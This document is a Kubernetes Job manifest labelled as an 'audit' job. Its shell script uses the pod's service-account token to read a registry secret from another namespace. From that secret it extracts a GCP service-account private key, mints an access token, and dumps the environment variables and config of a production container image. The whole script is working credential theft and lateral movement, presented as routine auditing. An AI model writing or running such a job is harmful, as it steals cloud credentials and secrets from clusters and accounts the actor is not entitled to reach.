apiVersion: batch/v1
kind: Job
metadata:
  name: dune-img-v4
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq openssl
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          
          # Get GCR SA JSON key from docker config auth
          DOCKER_CONFIG=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
            jq -r '.data[".dockerconfigjson"]' | base64 -d)
          
          GCR_AUTH_B64=$(echo "$DOCKER_CONFIG" | jq -r '.auths | to_entries[] | select(.key | contains("docker.pkg.dev")) | .value.auth')
          GCR_CREDS=$(echo "$GCR_AUTH_B64" | base64 -d)
          GCR_USER=$(echo "$GCR_CREDS" | head -c 10)
          # Password is everything after first colon
          SA_JSON=$(echo "$GCR_CREDS" | cut -d: -f2-)
          
          echo "GCR user: $GCR_USER"
          echo "SA project: $(echo "$SA_JSON" | jq -r '.project_id')"
          
          CLIENT_EMAIL=$(echo "$SA_JSON" | jq -r '.client_email')
          echo "SA email: $CLIENT_EMAIL"
          echo "$SA_JSON" | jq -r '.private_key' > /tmp/gcr_key.pem
          
          # Sign JWT for GCP SA auth  
          NOW=$(date +%s); EXP=$((NOW + 3600))
          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcr_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          JWT="${HEADER}.${PAYLOAD}.${SIG}"
          
          TOKEN_RESP=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
            --data-urlencode "assertion=$JWT")
          ACCESS_TOKEN=$(echo "$TOKEN_RESP" | jq -r '.access_token')
          echo "GCP token status: $(echo "$TOKEN_RESP" | jq -r '.error // "ok"')"
          echo "GCP token len: ${#ACCESS_TOKEN}"
          
          REGISTRY="us-central1-docker.pkg.dev"
          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
          TAG="v0.0.39-alpha.9"
          
          # Exchange GCP token for Docker registry token
          DOCKER_TOKEN=$(curl -sf -u "oauth2accesstoken:${ACCESS_TOKEN}" \
            "https://${REGISTRY}/v2/token?service=${REGISTRY}&scope=repository:${REPO}:pull" | \
            jq -r '.token')
          echo "Docker token len: ${#DOCKER_TOKEN}"
          
          if [ -z "$DOCKER_TOKEN" ] || [ "$DOCKER_TOKEN" = "null" ]; then
            # Try using GCP access token directly as Bearer
            DOCKER_TOKEN="$ACCESS_TOKEN"
            echo "Using GCP token directly"
          fi
          
          MANIFEST_JSON=$(curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
          CONFIG_DIGEST=$(echo "$MANIFEST_JSON" | jq -r '.config.digest')
          echo "Config digest: $CONFIG_DIGEST"
          
          if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
            echo "=ENV_VARS="
            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
              jq -r '.config.Env[]?' 2>/dev/null
            echo "=END_ENV="
            
            echo "=FULL_CONFIG="
            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
              jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}'
            echo "=END_FULL="
          fi
          
          echo "MANIFEST_ERR: $(echo "$MANIFEST_JSON" | jq -r '.errors[0].message // "none"')"